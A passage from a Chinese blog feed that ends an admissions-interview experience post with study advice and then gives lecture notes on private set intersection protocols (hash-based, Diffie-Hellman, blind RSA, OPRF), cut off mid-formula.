paragraph&quot;，大家一定要听清楚呀，因为之前学长也被问过这个，我本来想去学RL但是懒狗……不过我当时读和翻译的还算ok吧。去年学长英文面试就翻译，但是由于我读和翻译太快了（大家翻译时慢点翻译，翻好别急），然后就问了我三个问题：1、谈谈对大数据的理解；2、谈谈你的职业规划；3、你在高科技领域最崇拜谁，并给出原因。第1个问题，由于我没好好准备，只看过大数据的中文科普，没看过英文的呀，磕磕绊绊挤出来几句；第2个问题，自己”career“这个单词没反应过来，挺尴尬的；第3个问题，当时句子长问的很快、网络也一般，我硬是两遍都没听懂，好在最后懂了，然后说了我的偶像姚期智先生，当时慌乱了，不然应该能答更好些。总之，英文面试比较糟糕。</p><p>中文面试中老师脸色都很严肃、吓人，那我就看摄像头吧。之前学长没被抽数学题，但我被抽到了一道概率论题，2分钟解决一道“抽签与次序无关”的简单题，知道结论后算的胸有成竹吧。然后问了我项目中的问题，主要是关于AI部分的问题，比如模型可解释性是怎么做的、分布式机器学习有哪些指标。这些都是我做的，也能猜到会问什么问题，但是当时有点紧张，加上太久没面试了，回答的不好也不差吧。</p><blockquote><p>最后能通过考核挺意外的，不过一路过来都感觉自己把其他学校学生想的太厉害了，导致自己不敢尝试更高的平台。西电网安全国来说是很强的，培养出的学生也很不错，大家一定要有这个自信！</p></blockquote><h1 id="建议">建议</h1><ul><li><p><strong>提升均分和排名</strong>，rk1或2几乎就是清北敲门砖。当然，这半年都下来，周围的同学们几乎都能拿到心仪offer。</p></li><li><p>不要妄自菲薄，在我遇到的所有面试中，包括清华的老师，都是挺喜欢西电的学生，大家一定要<strong>自信，上研究生后要好好表现</strong>。相信明年此时一定会有比我们强的很多的同学，所以大家一定要好好努力。</p></li><li><p><strong>多看b站经验分享和经验贴</strong>，比如男生买件polo衫这种有领口的衣服，找个安静整洁的面试场所还挺重要的。当然大家之后也可以记录一下自己的经验贴。</p></li><li><p>面试更多的还是看实力，<strong>不要只管着专业课刷高分，选修课也按兴趣好好学吧</strong>。专业问题很难都准备到（可能各个学校很不一样），更多的是寻求心理上安慰，不过要是真不复习被抽到课内知识没回到上来还是非常尴尬的。<strong>项目更要多多投入时间</strong>，做啥项目都认真做，不要太功利，享受过程提升自我即可，这样以后和大佬合作的机会才会越来越多。</p></li><li><p>rk很靠前的同学没必要报太多学校，找个保底专心冲清北华五吧；rk较低的同学可以试试海投策略，多主动联系老师。虽然肯定会有比较焦虑的同学手握很多offer，但咱做好自己不海就行，全程控制自己手里offer不要超过2个或3个吧。</p></li><li><p>有问题多找名次相近的学长学姐请教，大部分学长学姐有空时都会热心帮助；其次，和任课老师和比赛指导老师适当交流，很多老师很热心的，从他们的言语常常会透露出他们对其他老师的了解。当然，有些老师会热心到给你推荐老师，我觉得咱们都是成年人了，自己主动去和其他老师聊也挺好，至少万一鸽老师时不会得罪中间人。</p></li></ul><blockquote><p>有问题时欢迎在评论中提问，如果有非常隐私的问题就通过邮件交流：3174626517 AT-&gt; <a href="http://qq.com">qq.com</a> （直接说明来意即可）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技巧总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>隐私求交技术的原理、发展及应用</title>
      <link href="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>视频：<a href="https://www.bilibili.com/video/BV1PT411J7rm?spm_id_from=333.337.search-card.all.click&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">【隐私计算技术】隐私求交PSI技术的原理及发展</a></p><p>介绍了隐私求交的基本定义以及常见应用。介绍了常用的PSI协议以及它们的原理并进行了效率分析。基于哈希的PSI效率上达到了低通信量、低计算量，但在安全方面可能遭到攻击，故现在已经不采用这种方法进行隐私求交；基于公钥密码学的PSI实现了中计算量、低通信量，同时也保证了整个协议的安全。</p><span id="more"></span><h1 id="简介">简介</h1><p><code>PSI(Private Set Intersection)</code>是一种<u>特殊的安全计算协议</u></p><ul><li>参与方数量&gt;= 2</li><li>功能：计算参与方数据的交集</li><li>安全：不泄露交集外的元素（需要Provable Security）</li></ul><p>已有工作的两个主要思路：</p><ul><li>通用安全计算（MPC, HE, ……）：天然支持后续安全计算</li><li>轻量级密码原语（OT, VOLE, ……）：效率高</li></ul><h2 id="两方半诚实PSI">两方半诚实PSI</h2><p>挑战与要求：</p><ol><li><p><strong>隐私非交集元素（hiding)</strong></p><ul><li>密码学安全的&quot;隐藏&quot;</li><li>当两个元素不等时，必须对比较结果添加<code>噪声（noise）</code>以防止不匹配的元素被穷举计算</li></ul></li><li><p><strong>计算交集元素（comparing）</strong></p><ul><li>当两元素相等时，相等的结果应当**以某种方式（明文/支持后续安全计算）**的方式公布</li></ul></li><li><p><strong>高效率（efficiency）</strong></p><ul><li>PSI协议应当在面对大规模应用时高效可用</li></ul></li></ol><h1 id="常用的PSI协议及原理">常用的PSI协议及原理</h1><h2 id="Hash-based-PSI（insecure）">Hash-based PSI（insecure）</h2><p>密码学安全的哈希函数的安全性质包括：</p><ul><li><strong>单向性（抗原像攻击）</strong>：对任意给定的Hash码 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span>，找到满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">H(x)=h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 在计算上是不可行的</li><li><strong>抗第二原像攻击（抗弱碰撞性）</strong>：对任何给定的分快<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，找到满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo mathvariant="normal">≠</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y\ne x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x)=H(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 在计算上是不可行的</li><li><strong>抗碰撞攻击（抗强碰撞性</strong>）：找到任何满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x)=H(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 的偶对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>在计算上是不可行的</li></ul><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174040545.png" alt></p><hr><p>效率：低计算量、低通信量</p><p>安全：<strong>可能遭到攻击</strong></p><ol><li>输入数据值小时遭到穷举攻击和字典攻击</li><li>不满足前向安全性</li></ol><h2 id="PKC-based-PSI">PKC-based PSI</h2><h3 id="PSI-based-on-DH">PSI based on DH</h3><p><strong>基本思想：具有<code>交换（commutative）</code>性质的&quot;双重加密&quot;</strong>。（交换性质是进行比较的基础）</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174308905.png" alt></p><hr><p>效率：中计算量、低通信量（仍为PSI的主流实现方式）</p><p>安全：PKC-based安全（基于离散对数问题（Discrete Logarithm Problem, DLP））</p><h3 id="PSI-based-on-Blind-RSA">PSI based on Blind RSA</h3><p>通过比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">H(x_i)^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">H(y_i)^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span></span></span> 求交。Receiver不能直接发送<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，因此先引入掩码，在完成目标运算后消除掩码。</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174455431.png" alt></p><hr><p>效率：中计算量、低通信量（接收方的计算量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≪</mo></mrow><annotation encoding="application/x-tex">\ll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≪</span></span></span></span> 发送方计算量——解密操作耗时大于加密）</p><p>安全：PKC-based安全</p><h2 id="OPRF-based-PSI">OPRF-based PSI</h2><p><code>伪随机函数（Pseudorandom Function, PRF)</code>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>k</mi><mo>∈</mo><mi mathvariant="script">K</mi><mo separator="true">,</mo><mi>m</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>l</mi></msup></mrow><annotation encoding="application/x-tex">\forall k\in \mathcal{K},m\in \{0,1\}^l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathcal" style="margin-right:0.01445em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span></span></span></span>，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>≈</mo><mi>U</mi><mi>n</mi><mi>i</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mtext> </mtext><mi>R</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">F(k,m)\approx Uniform\ Random</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">ni</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span></span></span></span></p><p><code>不经意伪随机函数（Oblivious PRF，OPRF）</code>：给定一个来自Sender（Bob）的密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 和一个来自Receiver（Alice）的输入元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>:</p><ul><li>Receiver知道 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k,m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，但是不知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></li><li>Sender只知道 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，但不知道计算结果和输入数据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></li></ul><p>流程示意如下图所示：</p><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717193239879.png" alt></p><p>使用OPRF构造PSI：对于Receiver拥有的每一个数据 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，都会产生一个对应的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，而Sender会利用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对其每一个数据 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">y_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" 